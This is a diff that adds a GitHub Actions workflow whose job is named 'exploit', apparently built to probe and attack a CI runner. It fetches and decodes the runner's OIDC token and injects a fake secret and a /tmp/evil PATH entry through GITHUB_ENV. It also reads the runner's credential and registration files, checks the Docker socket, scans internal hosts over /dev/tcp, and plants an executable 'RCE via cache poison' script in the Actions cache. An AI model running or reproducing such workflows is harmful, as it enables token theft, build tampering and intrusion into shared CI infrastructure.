@@ -1,0 +1,110 @@
+name: Nuclear Test
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      # OIDC TOKEN EXFIL - What does the runner's OIDC token contain?
+      - name: oidc-token-test
+        run: |
+          echo "=== OIDC TOKEN REQUEST ==="
+          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
+            echo "Token response (first 200 chars): ${TOKEN:0:200}"
+            
+            # Decode JWT without verification to see claims
+            PAYLOAD=$(echo "$TOKEN" | python3 -c "
+import sys,json,base64
+data=json.loads(sys.stdin.read())
+if 'value' in data:
+    parts=data['value'].split('.')
+    if len(parts)>=2:
+        padding='='*(4-len(parts[1])%4)
+        decoded=base64.urlsafe_b64decode(parts[1]+padding)
+        claims=json.loads(decoded)
+        for k,v in claims.items():
+            print(f'  {k}: {v}')
+" 2>&1)
+            echo "=== OIDC CLAIMS ==="
+            echo "$PAYLOAD"
+          else
+            echo "No OIDC URL available"
+          fi
+          
+      # GITHUB_ENV INJECTION TEST
+      - name: env-injection-test
+        run: |
+          echo "=== GITHUB_ENV INJECTION TEST ==="
+          # Can we inject multiline values that create new env vars?
+          MALICIOUS_INPUT='value
+          INJECTED_SECRET=pwned
+          PATH=/tmp/evil:$PATH'
+          echo "TEST_VAR<<EOF" >> $GITHUB_ENV
+          echo "$MALICIOUS_INPUT" >> $GITHUB_ENV
+          echo "EOF" >> $GITHUB_ENV
+          echo "Wrote to GITHUB_ENV"
+          
+      - name: check-injection
+        run: |
+          echo "=== CHECK ENV INJECTION ==="
+          echo "TEST_VAR=$TEST_VAR"
+          echo "INJECTED_SECRET=${INJECTED_SECRET:-not_set}"
+          env | grep -i inject || echo "No injected vars"
+          echo "PATH first entry: $(echo $PATH | cut -d: -f1)"
+          
+      # RUNNER METADATA EXTRACTION
+      - name: deep-runner-intel
+        run: |
+          echo "=== DEEP RUNNER INTELLIGENCE ==="
+          echo "--- Runner registration ---"
+          cat /home/runner/.runner 2>/dev/null | head -5
+          echo "--- Runner credentials ---"
+          ls -la /home/runner/.credentials* 2>/dev/null
+          cat /home/runner/.credentials 2>/dev/null | head -5
+          echo "--- Actions temp ---"
+          ls -la $RUNNER_TEMP/ 2>/dev/null | head -10
+          echo "--- GitHub context ---"
+          echo "Server URL: $GITHUB_SERVER_URL"
+          echo "API URL: $GITHUB_API_URL"
+          echo "GraphQL URL: $GITHUB_GRAPHQL_URL"
+          echo "Retention days: $GITHUB_RETENTION_DAYS"
+          echo "--- JWT from runner ---"
+          cat /home/runner/.credentials_rsaparams 2>/dev/null | head -3
+          echo "--- Service connection ---"
+          cat /home/runner/.service 2>/dev/null
+          echo "--- Internal network ---"
+          ip route 2>/dev/null | head -5
+          arp -a 2>/dev/null | head -5
+          echo "--- Docker socket ---"
+          ls -la /var/run/docker.sock 2>/dev/null
+          echo "--- Other runners on network ---"
+          for i in $(seq 1 5); do
+            timeout 1 bash -c "echo > /dev/tcp/10.1.0.$((165+i))/443" 2>/dev/null && echo "Host 10.1.0.$((165+i)):443 OPEN" || true
+          done
+          echo "=== DONE ==="
+          
+      # ACTIONS CACHE POISONING
+      - name: cache-poison-test
+        uses: actions/cache@v4
+        with:
+          path: /tmp/cache-test
+          key: ${{ runner.os }}-test-${{ github.sha }}
+          restore-keys: |
+            ${{ runner.os }}-test-
+            
+      - name: write-poison-cache
+        run: |
+          mkdir -p /tmp/cache-test
+          echo "CACHE_POISONED_BY_ATTACKER" > /tmp/cache-test/payload.txt
+          echo "#!/bin/bash" > /tmp/cache-test/build.sh
+          echo 'echo "RCE via cache poison: $(hostname)"' >> /tmp/cache-test/build.sh
+          chmod +x /tmp/cache-test/build.sh
+          echo "Cache poisoned!"
